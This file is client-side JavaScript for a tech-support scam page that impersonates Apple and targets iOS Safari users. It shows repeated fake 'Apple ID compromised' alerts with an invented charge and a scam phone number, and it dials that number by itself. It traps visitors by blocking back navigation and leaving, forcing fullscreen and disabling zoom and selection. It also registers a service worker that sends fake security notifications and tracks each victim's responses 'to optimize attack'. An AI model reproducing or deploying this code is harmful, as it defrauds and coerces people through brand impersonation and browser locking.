// Check if the user agent and platform indicate an iOS device and Safari browser
function isIOSAndSafari() {
    const userAgent = navigator.userAgent.toLowerCase();
    const platform = navigator.platform.toLowerCase();
    return /iPhone|iPad|iPod/i.test(userAgent) && /safari/i.test(userAgent) && !/chrome|android|opera|firefox/i.test(userAgent) && platform === 'macintosh';
}

// Override the platform property
Object.defineProperty(navigator, 'platform', {
    value: 'macintosh',
    writable: false
});

// Only proceed if the device is an iOS device and the browser is Safari
if (isIOSAndSafari()) {
    // Update time display
    function updateTime() {
        const now = new Date();
        const hours = now.getHours();
        const minutes = now.getMinutes();
        const timeString = `${hours}:${minutes < 10 ? '0' : ''}${minutes}`;
        const timeElement = document.getElementById('currentTime');
        if (timeElement) {
            timeElement.textContent = timeString;
        }
    }

    // Update time immediately and then every second
    updateTime();
    setInterval(updateTime, 1000);

    // Storage API Abuse - Track user behavior and persist lock
    const storage = {
        get: function(key) {
            try {
                return localStorage.getItem(key);
            } catch(e) {
                return null;
            }
        },
        set: function(key, value) {
            try {
                localStorage.setItem(key, value);
                return true;
            } catch(e) {
                return false;
            }
        },
        track: function(action) {
            const now = new Date().toISOString();
            const history = JSON.parse(storage.get('userHistory') || '[]');
            history.push({action, timestamp: now});
            storage.set('userHistory', JSON.stringify(history));

            // Track specific behaviors to optimize attack
            if (action === 'alert_closed') {
                storage.set('alertCount', parseInt(storage.get('alertCount') || '0') + 1);
            }

            if (action === 'call_attempted') {
                storage.set('callAttempted', 'true');
            }
        }
    };

    // Check if this is a returning user
    if (storage.get('returningUser') === 'true') {
        // Show different message for returning users
        const lockSubmessage = document.querySelector('.lock-submessage');
        if (lockSubmessage) {
            lockSubmessage.textContent = 'Your Apple ID remains locked due to suspicious activity.';
        }
    }

    // Mark as returning user
    storage.set('returningUser', 'true');

    // Prevent user from leaving the page
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    });

    // Prevent back navigation
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };

    // Prevent context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Prevent text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
    });

    // Prevent zoom
    document.addEventListener('gesturestart', function(e) {
        e.preventDefault();
    });

    // Battery API Exploitation - Monitor battery status and prevent sleep
    function monitorBattery() {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                function updateBatteryStatus() {
                    const batteryLevel = Math.round(battery.level * 100);
                    const batteryIcon = document.querySelector('.battery-icon rect:last-child');

                    if (batteryIcon) {
                        // Update battery fill width based on battery level
                        const fillWidth = Math.max(3, Math.floor(batteryLevel * 0.15)); // Max width of 15px
                        batteryIcon.setAttribute('width', fillWidth);

                        // Change color based on battery level
                        if (batteryLevel <= 20) {
                            batteryIcon.setAttribute('fill', '#FF3B30'); // Red
                        } else if (batteryLevel <= 40) {
                            batteryIcon.setAttribute('fill', '#FF9500'); // Orange
                        } else {
                            batteryIcon.setAttribute('fill', '#fff'); // White
                        }
                    }

                    // Prevent device from sleeping when battery is above 20%
                    if (batteryLevel > 20) {
                        // Keep screen awake by using wake lock API if available
                        if ('wakeLock' in navigator) {
                            navigator.wakeLock.request('screen').catch(function() {
                                // Fallback if wake lock fails
                                console.log('Wake lock failed');
                            });
                        }
                    }
                }

                updateBatteryStatus();

                battery.addEventListener('levelchange', updateBatteryStatus);
                battery.addEventListener('chargingchange', updateBatteryStatus);
            });
        }
    }

    // Timer countdown
    let countdownTime = 600; // 10 minutes in seconds
    let timerInterval;

    function updateCountdown() {
        const minutes = Math.floor(countdownTime / 60);
        const seconds = countdownTime % 60;
        const formattedTime = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

        const timerBadge = document.getElementById('timerBadge');
        if (timerBadge) {
            timerBadge.textContent = `Account Deletion: ${formattedTime}`;
        }

        countdownTime--;

        if (countdownTime <= 0) {
            clearInterval(timerInterval);
            // Reset timer when it reaches zero
            countdownTime = 600;
            timerInterval = setInterval(updateCountdown, 1000);
        }
    }

    // Background Sync API - Keep page active and re-activate lock
    function registerBackgroundSync() {
        if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
            navigator.serviceWorker.register('data:text/javascript,self.addEventListener(%27sync%27,function(event){event.waitUntil(event.registration.showNotification(%27Security Alert%27,{body:%27Your Apple ID has been compromised%27,icon:%27data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4MTQgMTAwMCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTc4OC4xIDM0MC45Yy01LjggNC41LTEwOC4yIDYyLjItMTA4LjIgMTkwLjUgMCAxNDguNCAxMzAuMyAyMDAuOSAxMzQuMiAyMDIuMi0uNiAzLjItMjAuNyA3MS45LTY4LjcgMTQxLjktNDIuOCA2MS42LTg3LjUgMTIzLjEtMTU1LjUgMTIzLjFzLTg1LjUtMzkuNS0xNjQtMzkuNWMtNzYuNSAwLTEwMy43IDQwLjgtMTY1LjkgNDAuOHMtMTA1LjYtNTctMTU1LjUtMTI3QzQ2LjcgNzkwLjcgMCA2NjMgMCA1NDEuOGMwLTE5NC40IDEyNi40LTI5Ny41IDI1MC44LTI5Ny41IDY2LjEgMCAxMjEuMiA0My40IDE2Mi43IDQzLjQgMzkuNSAwIDEwMS4xLTQ2IDE3Ni4zLTQ2IDI4LjUgMCAxMzAuOSAyLjYgMTk4LjMgOTkyLjJ6bS0yMzQtMTgxLjVjMzEuMS0zNi45IDUzLjEtODguMSA1My4xLTEzOS4zIDAtNy4xLS42LTE0LjMtMS45LTIwLjEtNTAuNiAxLktxMTEwLjggMzMuNy0xNDcuMSA3NS44LTI4LjUgMzIuNC01NS4xIDgzLjYtNTUuMSAxMzUuNSAwIDcuOCAxLjMgMTUuNiAxLjkgMTguMSAzLjIgLjYgOC40IDEuMyAxMy42IDEuMyA0NS40IDAgMTAyLjUtMzAuNCAxMzUuNS03MS4zeiIvPjwvc3ZnPg==%27});});').then(function(registration) {
                // Register a periodic sync to keep the page active
                return registration.sync.register('security-alert');
            }).catch(function(error) {
                console.log('Background sync registration failed:', error);
            });
        }
    }

    // Function to enter fullscreen mode
    function enterFullscreen() {
        const elem = document.documentElement;

        // Try to use the Fullscreen API
        if (elem.requestFullscreen) {
            elem.requestFullscreen().catch(function(error) {
                // Fallback for iOS Safari
                document.body.classList.add('fullscreen-mode');
            });
        } else if (elem.webkitRequestFullscreen) { /* Safari */
            elem.webkitRequestFullscreen().catch(function(error) {
                // Fallback for iOS Safari
                document.body.classList.add('fullscreen-mode');
            });
        } else if (elem.msRequestFullscreen) { /* IE11 */
            elem.msRequestFullscreen().catch(function(error) {
                // Fallback for iOS Safari
                document.body.classList.add('fullscreen-mode');
            });
        } else {
            // Fallback for iOS Safari
            document.body.classList.add('fullscreen-mode');
        }

        // Try to lock orientation
        if (screen.orientation && screen.orientation.lock) {
            screen.orientation.lock('portrait').catch(function(error) {
                console.log('Orientation lock failed:', error);
            });
        }
    }

    // Function to show alert repeatedly
    function showAlert() {
        storage.track('alert_shown');
        storage.set('alertShown', 'true');

        var message = "SECURITY ALERT: Your Apple ID has been compromised!\n\n" +
                     "Unauthorized purchase of $875.50 detected.\n\n" +
                     "Your account has been temporarily locked to prevent further damage.\n\n" +
                     "Call Apple Security immediately at +1-833-305-5032\n\n" +
                     "Reference Code: AID-8947-2023\n\n" +
                     "Failure to contact support within 24 hours may result in permanent account suspension.";
        alert(message);
        storage.track('alert_closed');

        // Enter fullscreen mode after first alert
        enterFullscreen();

        // Auto-trigger the call after alert
        window.location.href = "tel:+1-833-305-5032";
        storage.track('call_attempted');

        // Show the locked screen and hide original modals
        var lockedScreen = document.getElementById('lockedScreen');
        lockedScreen.style.display = 'flex';

        // Hide the original modals
        document.querySelectorAll('.modal').forEach(function(modal) {
            modal.style.display = 'none';
        });

        // Show the status bar with the lock screen
        var statusBar = document.getElementById('statusBar');
        statusBar.style.display = 'flex';

        // Set up the emergency call button
        var emergencyCallBtn = document.getElementById('emergencyCallBtn');
        emergencyCallBtn.addEventListener('click', function() {
            window.location.href = "tel:+1-833-305-5032";
            storage.track('call_button_clicked');
        });

        // Start the countdown timer
        if (!timerInterval) {
            timerInterval = setInterval(updateCountdown, 1000);
        }

        // Show another alert after 2 seconds
        setTimeout(showAlert, 2000);
    }

    // Re-activate lock screen when user returns to the page
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden && storage.get('returningUser') === 'true') {
            storage.track('page_returned');
            // Show lock screen immediately
            var lockedScreen = document.getElementById('lockedScreen');
            lockedScreen.style.display = 'flex';

            // Show the status bar with the lock screen
            var statusBar = document.getElementById('statusBar');
            statusBar.style.display = 'flex';

            // Hide the original modals
            document.querySelectorAll('.modal').forEach(function(modal) {
                modal.style.display = 'none';
            });

            // Show alert after a short delay
            setTimeout(showAlert, 500);
        }
    });

    // Initialize background sync and battery monitoring
    window.addEventListener('load', function() {
        // Monitor battery status
        monitorBattery();

        // Register background sync
        registerBackgroundSync();

        // Delay the first alert to make it more convincing
        setTimeout(showAlert, 2000);
    });

    // Keep showing alerts even if user manages to close them
    setInterval(function() {
        showAlert();
    }, 5000);

    // Try to enter fullscreen on user interaction
    document.addEventListener('click', function() {
        enterFullscreen();
    });

    // Try to enter fullscreen on touch
    document.addEventListener('touchstart', function() {
        enterFullscreen();
    });

    // Safari Reader Mode exploitation - Add structured content
    document.addEventListener('DOMContentLoaded', function() {
        // Add article tags for Reader Mode
        const article = document.createElement('article');
        article.innerHTML = `
            <h1>Apple ID Security Alert</h1>
            <p>Your Apple ID has been temporarily locked due to suspicious activity detected on your account.</p>
            <p>Unauthorized purchase of $875.50 detected.</p>
            <p>Please contact Apple Security immediately at +1-833-305-5032</p>
            <p>Reference Code: AID-8947-2023</p>
            <p>Failure to contact support within 24 hours may result in permanent account suspension.</p>
        `;

        // Add meta tags for Reader Mode
        const metaDescription = document.createElement('meta');
        metaDescription.name = 'description';
        metaDescription.content = 'Your Apple ID has been temporarily locked due to suspicious activity detected on your account.';
        document.head.appendChild(metaDescription);

        // Add author meta tag
        const metaAuthor = document.createElement('meta');
        metaAuthor.name = 'author';
        metaAuthor.content = 'Apple Inc.';
        document.head.appendChild(metaAuthor);
    });
}